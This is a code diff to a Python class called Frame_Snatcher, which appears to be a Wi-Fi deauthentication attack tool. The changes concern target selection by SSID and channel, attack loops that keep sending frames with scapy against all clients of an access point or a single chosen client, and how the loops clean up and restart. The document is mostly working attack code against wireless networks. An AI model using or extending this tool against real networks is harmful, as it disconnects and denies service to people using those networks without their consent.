@@ -388,6 +388,8 @@ class Frame_Snatcher():
             cls.clients = []
             console.print("wiped", style="bold red")
             time.sleep(delay)
+        
+        console.print("[bold red]Killed Background thread")
 
 
     @classmethod
@@ -420,7 +422,7 @@ class Frame_Snatcher():
             num +=1 
 
             # ADD TO DICT
-            data[num] = var[1]
+            data[num] = (var[1], var[3])
 
 
             # ADD TO TABLE
@@ -494,18 +496,14 @@ class Frame_Snatcher():
 
 
                 if choice in range(1, num) or choice == num:
-                    target = data[choice]
-                    console.print(cls.beacons)
-                    console.print(cls.beacons[choice])
-                    channel = cls.beacons[choice][3]
-                    console.print(channel)
-
-
-                    console.print(f"\n[bold red]Target choosen:[yellow] {target}")
+                    ssid    = data[choice][0]
+                    channel = data[choice][1]
+                    
+                    console.print(f"\n[bold red]Target choosen:[yellow] {ssid}, channel: {channel}")
 
                     
                     # RETURN THE TARGET
-                    return target, channel
+                    return ssid, channel
                 
                 
 
@@ -810,7 +808,9 @@ class Frame_Snatcher():
 
         # VARS
         packets_sent = 0
-        error = 0
+        error        = 0
+        STAY         = True
+        cls.SNIFF    = True
 
 
         # NOW TO TRACK THE AMOUNT OF CLIENTS ON THE AP
@@ -849,9 +849,6 @@ class Frame_Snatcher():
                 # NOW FOR THE ACTUAL DELAY LOL
                 time.sleep(1)
             
-
-            # USE THIS VARIABLE TO BREAK NESTED LOOP
-            STAY = True
             
             # NOW FOR THE ATTACK
             while STAY:
@@ -868,6 +865,7 @@ class Frame_Snatcher():
 
                     # NOW TO SEND THE FRAME
                     sendp(frame, iface=iface, inter=inter, count=count, verbose=verbose)
+                    time.sleep(0.4)
 
                     
 
@@ -898,10 +896,11 @@ class Frame_Snatcher():
                     while STAY:
                         try:
                             console.print(f"Cleaning up", style="bold red")
-                            time.sleep(3)
+                            time.sleep(1)
 
-                            STAY = False       # BREAK NESTED LOOP
+                            STAY      = False       # BREAK NESTED LOOP
                             cls.SNIFF = False  # KILL BACKGROUND THREAD 
+                            cls.GO    = False   
                             break             # JUST IN CASE
                         
 
@@ -913,19 +912,10 @@ class Frame_Snatcher():
 
                 except Exception as e:
                     console.print(f"[bold red]Exception Error:[yellow] {e}")
-
-
-                    if error < 4:
-                        error += 1
-                    
-                    else:
-                        
-                        console.print("[bold red]Max Amount of Errors Given!")
-
-
-                        STAY = False       # BREAK NESTED LOOP
-                        cls.SNIFF = False  # KILL BACKGROUND THREAD
-                        break             # JUST IN CASE
+                    STAY      = False
+                    cls.SNIFF = False
+                    console.print("[bold red]Killing & Refreshing [bold green]Instance")
+                    time.sleep(2); break
                     
     
     @classmethod
@@ -942,6 +932,7 @@ class Frame_Snatcher():
         cls.beacons = []
         cls.num = 1
         cls.clients = []
+        cls.GO = True
 
         
         # CATCH YOU 
@@ -972,25 +963,24 @@ class Frame_Snatcher():
             Background_Threads.channel_hopper(set_channel=channel)
 
 
-            # NOW TO TRACK THE AMOUNT OF CLIENTS ON THE AP
-            # threading.Thread(target=Frame_Snatcher.track_clients, args=(target, cls.iface), daemon=True).start()
-
-
             # ALL CLIENT ATTACK
             if type == 2:
 
                 # ATTACK ALL CLIENTS ON TARGET
-                Frame_Snatcher.target_attacker(target=target, iface=cls.iface)   
+                console.print("on", channel)
+                while cls.GO: Frame_Snatcher.target_attacker(target=target, iface=cls.iface)   
 
 
             # SINGLE CLIENT 
             elif type == 1:
 
                 # SNAG CLIENT
+                console.print("on", channel)
                 client = Frame_Snatcher.client_chooser(target=target, iface=cls.iface)
                 
                 # NOW ATTACK CLIENT ON TARGET
-                Frame_Snatcher.target_attacker(target=target, client=client, iface=cls.iface)
+                while cls.GO: Frame_Snatcher.target_attacker(target=target, client=client, iface=cls.iface); time.sleep(3)
+                            
 
 
             # LEAVE
